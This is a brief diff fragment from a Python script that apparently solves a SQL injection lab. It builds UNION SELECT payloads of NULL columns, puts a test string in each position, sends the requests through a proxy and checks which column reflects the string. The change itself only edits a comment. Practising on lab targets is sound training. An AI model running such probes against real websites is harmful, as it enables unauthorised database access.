@@ -20,7 +20,7 @@ def get_string(url, col):
     for i in range(1, col + 1):
         null_lst.append("null")
     for i in range(1, col + 1):
-        null_lst[i - 1] = 'a' # Replace this with string mentioned in the lab (since it changes for every session)
+        null_lst[i - 1] = 'a' # Replace this with string mentioned in the lab (since  changes for every session)
         payload = payload + ', '.join(null_lst) + '--'
         r = requests.get(url+payload, verify=False, proxies=proxies)
         if 'a' in r.text:
